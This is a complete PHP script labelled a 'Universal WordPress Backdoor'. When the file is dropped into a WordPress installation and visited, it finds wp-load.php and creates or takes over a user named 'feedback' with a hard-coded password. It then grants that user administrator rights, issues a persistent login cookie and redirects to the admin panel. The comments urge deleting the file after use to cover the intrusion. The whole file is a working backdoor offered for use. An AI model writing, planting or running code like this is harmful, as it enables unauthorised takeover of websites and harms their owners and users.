<?php
// Universal WordPress Backdoor - yoast-service auto-login
// Place anywhere inside WP folder → visit once → auto logs in as admin
// DELETE THIS FILE IMMEDIATELY AFTER USE!

header('Content-Type: text/html; charset=utf-8');

$max_depth = 8;
$current_dir = __DIR__;
$wp_load = false;

for ($i = 0; $i < $max_depth; $i++) {
    $possible = $current_dir . '/wp-load.php';
    if (file_exists($possible)) {
        $wp_load = $possible;
        break;
    }
    $parent = dirname($current_dir);
    if ($parent === $current_dir) break;
    $current_dir = $parent;
}

if (!$wp_load) {
    http_response_code(500);
    die('Cannot find wp-load.php. Place this file inside your WordPress installation.');
}

require_once $wp_load;

// ────────────────────────────────────────────────
$username = 'feedback';
$email    = 'feedback@medical-congress.ro';
$password = 'Beloved234**122';   // Your fixed password

echo '<pre style="font-family:monospace; background:#111; color:#0f0; padding:20px; border-radius:8px; line-height:1.5;">';
echo "Site: " . home_url() . "\n";
echo "File: " . __FILE__ . "\n\n";

$user = get_user_by('login', $username);

if ($user) {
    echo "→ User '{$username}' already exists (ID: {$user->ID})\n";
    wp_set_password($password, $user->ID);           // Force password update
    echo "→ Password has been reset to your chosen one\n";
    
    if (!user_can($user->ID, 'manage_options')) {
        $user->set_role('administrator');
        echo "→ Upgraded to Administrator role\n";
    }
} else {
    echo "→ Creating new user '{$username}' ...\n";
    
    $user_id = wp_insert_user([
        'user_login' => $username,
        'user_email' => $email,
        'user_pass'  => $password,      // WP will handle it
        'role'       => 'administrator'
    ]);

    if (is_wp_error($user_id)) {
        die("ERROR creating user: " . $user_id->get_error_message() . "\n");
    }

    $user = new WP_User($user_id);
    echo "→ User created successfully (ID: {$user_id})\n";
    echo "→ Role: Administrator\n";
}

// Final password enforcement
wp_set_password($password, $user->ID);

echo "\n→ Password set to: {$password}\n\n";

// ── Clean Auto Login ─────────────────────────────────
wp_clear_auth_cookie();                          // Important: clear old sessions
wp_set_current_user($user->ID, $user->user_login);
wp_set_auth_cookie($user->ID, true, is_ssl());   // remember me = true

update_user_meta($user->ID, 'last_secret_access', current_time('mysql'));

echo "✅ Successfully logged in as <strong>{$username}</strong>\n";
echo "→ Redirecting to wp-admin in 3 seconds...\n\n";
echo "⚠️  <strong>DELETE THIS FILE RIGHT NOW!</strong> → " . basename(__FILE__) . "\n";
echo "</pre>";

sleep(3);
wp_safe_redirect(admin_url());
exit;